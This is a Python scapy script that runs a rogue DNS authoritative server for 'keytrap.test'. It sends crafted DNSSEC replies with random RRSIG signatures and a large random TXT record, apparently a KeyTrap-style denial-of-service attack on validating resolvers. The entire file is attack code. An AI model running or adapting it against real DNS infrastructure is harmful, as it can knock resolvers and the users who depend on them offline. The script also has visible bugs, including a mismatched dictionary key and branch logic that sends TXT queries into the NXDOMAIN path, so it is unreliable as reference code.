from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR, DNSRRRSIG, DNSRRDNSKEY
from scapy.layers.inet import IP, UDP, TCP
from datetime import datetime
from functools import reduce
import base64

# 配置DNS服务器的IP和端口
IFACE_LAN = "eth0"
PORT_OF_SERVER = "53"
DOMAIN_NAME = ["www.keytrap.test.", "keytrap.test.", "ns1.keytrap.test.", "_ta-75b2.keytrap.test."]
GLOBAL_TTL = 86400

BPF_FILTER = "udp port "  + str(PORT_OF_SERVER) + " or tcp port " + str(PORT_OF_SERVER)

# RRSET大小
RRSET_BYTES = 8196

# 每次签名都需要更新以下条目：INCEPTION, EXPIRATION, RRSIG
INCEPTION = datetime.strptime("20241004070956", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
EXPIRATION = datetime.strptime("20241103070956", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
RRSIG={
    # RRSIG FOR NS RRSET.
    "keytrap.test": base64.b64decode("86nIYs8Wmj0nnfh3FSYxYOk7K3UpJfxv0LY2aukmq7NvCEYTP+BSz2GihOlDad/uNAyFaF/v7nPYAFeUtvzebpHG697pUFvPS7ODGBT3ejXNE/umO2G+lCO0zEQ4zsPM"),
    "ZSK": base64.b64decode("86nIYs8Wmj0nnfh3FSYxYOk7K3UpJfxv0LY2aukmq7NvCEYTP+BSz2GihOlDad/uNAyFaF/v7nPYAFeUtvzebpHG697pUFvPS7ODGBT3ejXNE/umO2G+lCO0zEQ4zsPM"),
    "KSK": base64.b64decode("kdTD8vDrZzCCQgj74tL8hjpz/axRsWVcl6HWxqy3EFlah4jab18pekvv4iUwzPZT/kEBUv5Ca/fYw+WLSpolcM2+XY1ICmrdozUN32GrOHxLCTpV9AFJBYOxuTy87RyI"),
}

DNSKEY={
    "ZSK": base64.b64decode("DcYreAh+USsK1mtv7bSR2iaQvShPUqCy7l/BRQXttAFupXp6pUaQZS+k ii+H2JJqd+rS4YgC3KCd/by8yQi5j+WSy2yRprSuFuDyqZMFnDT/Py+n GjmIa59+W1iMdEYb"),
    "KSK": base64.b64decode("MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hl hZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zht L4aGaOG+870yHwuY"),
}


def gen_random_rrsig(len=96):
    return os.urandom(len)



# 构造DNS响应
def craft_dns_response(pkt, qname, qtype):
    if TCP in pkt:
        reply_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(sport=int(PORT_OF_SERVER), dport=pkt[TCP].sport)
    else:
        reply_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=int(PORT_OF_SERVER), dport=pkt[UDP].sport)
    

    # 查询TXT记录
    if qtype == 16:
        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
                        an=
                            DNSRR(rrname=qname, type=16, ttl=GLOBAL_TTL, rdata=os.urandom(RRSET_BYTES)) /
                            DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
                            expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
                            signersname="keytrap.test", signature=gen_random_rrsig()),
                    )
    
        # 查询A记录
    if qtype == 1:
        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
                        an=
                            DNSRR(rrname=qname, type=1, ttl=GLOBAL_TTL, rdata="124.222.27.40") /
                            DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
                            expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
                            signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
                    )

    # 查询DNSKEY记录
    elif qtype == 48:

        key_list = [
            DNSRRDNSKEY(rrname="keytrap.test.", ttl=GLOBAL_TTL, algorithm=14, flags=256, publickey=DNSKEY["ZSK"]) /  DNSRRDNSKEY(rrname="keytrap.test.", ttl=GLOBAL_TTL, algorithm=14, flags=257, publickey=DNSKEY['KSK']),
            DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=48, originalttl=GLOBAL_TTL,
            expiration=EXPIRATION, inception=INCEPTION, keytag=6350, algorithm=14, 
            signersname="keytrap.test.", signature=RRSIG["ZSK"]),
            DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=48, originalttl=GLOBAL_TTL,
            expiration=EXPIRATION, inception=INCEPTION, keytag=30130, algorithm=14, 
            signersname="keytrap.test.", signature=RRSIG["KSK"]),
        ]

        keyset = reduce(lambda x, y: x / y, key_list)

        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
                    an=keyset 
                )
    else:
        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd, rcode=3,
                         ns=
                            DNSRR(rrname="keytrap.test.", type=2, ttl=GLOBAL_TTL, rdata="ns1.keytrap.test.") /
                            DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=2, originalttl=GLOBAL_TTL, 
                            expiration=EXPIRATION, inception=INCEPTION, keytag=6350, algorithm=14, 
                            signersname="keytrap.test", signature=RRSIG["keytrap.test."])
                        )
        
    return reply_pkt

# 处理DNS查询请求
def dns_response(pkt):
    try:
        if DNS not in pkt:
            return

        qname = pkt[DNS].qd.qname.decode("utf-8")
        
        if qname not in DOMAIN_NAME:
            return

        qtype = pkt[DNS].qd.qtype

        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : fm {pkt[IP].src} : {qname} {qtype} ?")

        # 构建DNS响应
        resp = craft_dns_response(pkt, qname, qtype)
        # resp.show2()
        send(resp, iface=IFACE_LAN)
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : to {pkt[IP].src} : {qname}\n")
        # 输出构造的回复大小
        pkt_size = len(resp)
        print(f"The size of the packet is: {pkt_size} bytes")


    except Exception as error:
        print("Error: ", error)

print("Start DNS Authority ...")
sniff(filter=BPF_FILTER, prn=dns_response, iface=IFACE_LAN)

# rec = IP(src="124.222.27.40")/UDP(dport=53)/DNS(qd=DNSQR(qname="www.keytrap.test.", qtype=1))
# pkt=craft_dns_response(rec, "www.keytrap.test.", 1)
# pkt.show2()

